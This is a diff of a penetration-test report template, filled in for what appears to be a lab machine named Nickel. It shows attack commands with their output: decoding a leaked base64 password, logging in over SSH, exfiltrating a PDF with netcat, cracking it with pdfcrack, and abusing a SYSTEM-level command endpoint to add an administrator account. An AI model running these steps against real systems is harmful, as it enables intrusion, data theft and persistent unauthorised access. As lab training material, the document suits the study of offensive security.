@@ -151,189 +151,166 @@ hydra -l root -P /usr/share/wordlists/rockyou.txt  ssh://10.11.12.13
 ```
 
 ### HTTP
-The target is NOT vulnerable to Shellshock.
 ```bash
-sudo nmap $TARGET -p80 --script http-shellshock -oN scans/$NAME-nmap-scripts-http-shellshock-80
-# replace the lines above with the actual scan results
+http://192.168.222.99:8089
+# change URL to match correct IP address
 ```
 
-Victor was able to discover the hidden directories below using Dirb.
+Burp Intruder > Action > Change request method
 ```bash
-dirb http://$TARGET:80 /usr/share/wordlists/dirb/big.txt -z10 -o scans/$NAME-dirb-big-80
+firefox http://192.168.222.99:33333/list-running-procs
 
 # output
-NSTR
-```
+name        : powershell.exe
+commandline : powershell.exe -nop -ep bypass C:\windows\system32\ws80.ps1
 
-Victor was able to discover the hidden directories below using Dirsearch.
-```bash
-dirsearch -u $TARGET:$PORT -o $FULLPATH/$NAME-dirsearch-80
-# replace the lines above with the actual scan results
-```
+...snipped...
 
-Victor was able to identify the following HTTP server misconfigurations using Nikto.
-```bash
-nikto -h $TARGET -p $PORT -T 2 -Format txt -o scans/$NAME-nikto-misconfig-80
+name        : cmd.exe
+commandline : cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p 
+              "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh
 
-# output
-NSTR
-```
+name        : powershell.exe
+commandline : powershell.exe -nop -ep bypass C:\windows\system32\ws8089.ps1
 
-### RPC
-```bash
-rpcclient -U '' $TARGET
-```
-```
-srvinfo
+name        : powershell.exe
+commandline : powershell.exe -nop -ep bypass C:\windows\system32\ws33333.ps1
 
-# output
-NSTR
-```
-```
-netshareenum
+...snipped...
 
-# output
-NSTR
-```
+name        : FileZilla Server.exe
+commandline : "C:\Program Files (x86)\FileZilla Server\FileZilla Server.exe"
 
-### NetBIOS
-```bash
-nbtscan $TARGET
-
-# output
-NSTR
-```
-
-### SMB
-The following SMB shares were discovered using Smbclient.
-```bash
-smbclient -L $TARGET
-
-# output
-NSTR
-```
-
-The SMB shares discovered have the following permissions.
-```bash
-smbmap -H $TARGET
-
-# output
-NSTR
-```
-
-Victor was able to download files from the accessible SMB share(s).
-```bash
-cd loot
-smbclient \\\\$TARGET\\$SHARE
-prompt
-mget *
-
-# output
-NSTR
-```
-
-The target is NOT vulnerable to EternalBlue.
-```bash
-# check if vulnerable to EternalBlue
-sudo nmap $TARGET -p445 --script smb-vuln-ms17-010 -oN scans/$NAME-nmap-scripts-smb-vuln-ms17-010
-# replace the lines above with the actual scan results
-```
-
-The target is NOT vulnerable to SambaCry.
-```bash
-# check if vulnerable to SambaCry
-sudo nmap $TARGET -p445 --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -oN scans/$NAME-nmap-scripts-smb-vuln-cve-2017-7494
-# replace the lines above with the actual scan results
-```
-
-### RDP
-```bash
-sudo nmap $TARGET -p3389 --script rdp-ntlm-info -oN scans/$NAME-nmap-scripts-rdp-ntlm-info
-# replace the lines above with the actual scan results
-```
-
-```bash
-rdesktop $TARGET
-
-# output
-Autoselecting keyboard map 'en-us' from locale
-Core(warning): Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.
-Failed to initialize NLA, do you have correct Kerberos TGT initialized ?
-Failed to connect, CredSSP required by server (check if server has disabled old TLS versions, if yes use -V option).
-```
-
-### Postgres
-```bash
-psql -U postgres -p 5437 -h $TARGET # postgres:postgres
-SELECT pg_ls_dir('/');
+name        : sshd.exe
+commandline : "C:\Program Files\OpenSSH\OpenSSH-Win64\sshd.exe"
 ```
 
 ## Gaining Access
 The penetration testing portions of the assessment focus heavily on gaining access to a variety of systems. During this penetration test, Victor was able to successfully gain access to 10 out of the 50 systems.
 
 ### Password Guessing  
-#### Default Credentials
 ```bash
-# CMS Web App 9000
-# admin:admin
-```
-
-#### Hydra
-```bash
-hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET http-post-form "/phpmyadmin/index.php?:pma_username=^USER^&pma_password=^PASS^:Cannot|without"
+echo "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" | base64 -d
 
 # output
-NSTR
+NowiseSloopTheory139
 ```
 
-#### Patator
 ```bash
-patator http_fuzz url=http://$TARGET/$LOGIN method=POST body='username=FILE0&password=FILE1' 0=usernames.txt 1=/usr/share/wordlists/rockyout.txt -x ignore:fgrep=Unauthorized
-```
+ssh ariah@192.168.222.99 # password: NowiseSloopTheory139
 
-### CVE-2021-1234
-#### EDB-ID-56789
-```bash
-searchsploit foo
-mkdir edb-id-56789
-cd edb-id-56789
-searchsploit -x 56789
-```
+# output
+Microsoft Windows [Version 10.0.18362.1016]
+(c) 2019 Microsoft Corporation. All rights reserved.
 
-#### cyberphor POC
-```bash
-git clone https://github.com/cyberphor/cve-2021-1234-poc.git
-cd cve-2021-56789-poc
-```
-
-#### Metasploit Module
-```bash
-msfconsole
-search ???
-use exploit/???/???
-set LHOST tun0
-set RHOST $TARGET
-run
+ariah@NICKEL C:\Users\ariah>
 ```
 
 ## Maintaining Access
 Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable. The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again. Many exploits may only be exploitable once and we may never be able to get back into a system after we have already per-formed the exploit. Victor added administrator and root level accounts on all systems compromised. In addition to the administrative/root access, a Metasploit meterpreter service was installed on the machine to en-sure that additional access could be established.
 
-### Privilege Escalation
-#### Linux
-```bash
-whoami
-cat /etc/passwd
-find / -perm -u=s -type f 2> /dev/null
-cat /etc/crontab
-```
-
 #### Windows
 ```bash
-whoami /priv
-systeminfo
-net user
-dir c:\
+sudo cp /usr/share/windows-binaries/nc.exe .
+sudo python3 -m http.server 80
+```
+
+```bash
+powershell
+cd c:\ftp
+iwr http://192.168.49.222/nc.exe -outfile nc.exe
+```
+
+```bash
+# attacker side
+nc -nvlp 80 > loot.pdf
+
+# victim side
+nc.exe 192.168.49.222 80 < Infrastructure.pdf
+```
+
+```bash
+sudo apt install pdfcrack
+pdfcrack loot.pdf -w /usr/share/wordlists/rockyou.txt
+
+# output
+PDF version 1.7
+Security Handler: Standard
+V: 2
+R: 3
+P: -1060
+Length: 128
+Encrypted Metadata: True
+FileID: 14350d814f7c974db9234e3e719e360b
+U: 6aa1a24681b93038947f76796470dbb100000000000000000000000000000000
+O: d9363dc61ac080ac4b9dad4f036888567a2d468a6703faf6216af1eb307921b0
+
+Average Speed: 64386.9 w/s. Current Word: 'shorty1000'
+Average Speed: 64406.8 w/s. Current Word: 'yossyluis'
+Average Speed: 63730.4 w/s. Current Word: 'shahzana'
+Average Speed: 63438.4 w/s. Current Word: 'newsnet1'
+Average Speed: 63633.8 w/s. Current Word: 'lacadie8'
+Average Speed: 63369.6 w/s. Current Word: 'haznkilla'
+Average Speed: 61379.8 w/s. Current Word: 'cupcakesa'
+found user-password: 'ariah4168'
+```
+
+```bash
+Infrastructure Notes
+Temporary Command endpoint: http://nickel/?
+Backup system: http://nickel-backup/backup
+NAS: http://corp-nas/files
+```
+
+```bash
+(iwr http://localhost/?whoami -usebasicparsing).RawContent
+
+# output
+HTTP/1.1 200 OK                                                                                                                        
+Content-Length: 118
+Date: Wed, 28 Jul 2021 01:43:22 GMT
+Last-Modified: Tue, 27 Jul 2021 18:43:22 GMT
+Server: Powershell Webserver/1.2 on Microsoft-HTTPAPI/2.0
+
+<!doctype html><html><body>dev-api started at 2020-10-20T10:38:24
+
+        <pre>nt authority\system
+</pre>
+</body></html>
+```
+
+```bash
+net user /add victor password; net localgroup administrators victor /add
+net%20user%20%2Fadd%20victor%20password%3B%20net%20localgroup%20administrators%20victor%20%2Fadd
+```
+
+```
+(iwr http://localhost/?net%20user%20%2Fadd%20victor%20password%3B%20net%20localgroup%20administrators%20victor%20%2Fadd -use basicparsing).RawContent
+
+# output
+HTTP/1.1 200 OK
+Content-Length: 175
+Date: Wed, 28 Jul 2021 01:42:31 GMT
+Last-Modified: Tue, 27 Jul 2021 18:42:31 GMT
+Server: Powershell Webserver/1.2 on Microsoft-HTTPAPI/2.0
+
+<!doctype html><html><body>dev-api started at 2020-10-20T10:38:24
+
+        <pre>The command completed successfully.
+
+The command completed successfully.
+
+</pre>
+</body></html>
+```
+
+```bash
+exit
+ssh victor@192.168.222.99 # password
+type c:\users\administrator\desktop\proof.txt
+
+# output
+5e5099aec5aafe58bd8ba5bd141f6b6c
 ```
 
 ## Covering Tracks
@@ -351,8 +328,8 @@ The house cleaning portions of the assessment ensures that remnants of the penet
 * Try harder
 
 ## Flags
-* local.txt = abcdef0123456789
-* proof.txt = abcdef0123456789
+* local.txt = e572d4bbef08cf61d3f6ff65a27aabca
+* proof.txt = 5e5099aec5aafe58bd8ba5bd141f6b6c
 
 ## Lessons Learned
 * Use multiple tools
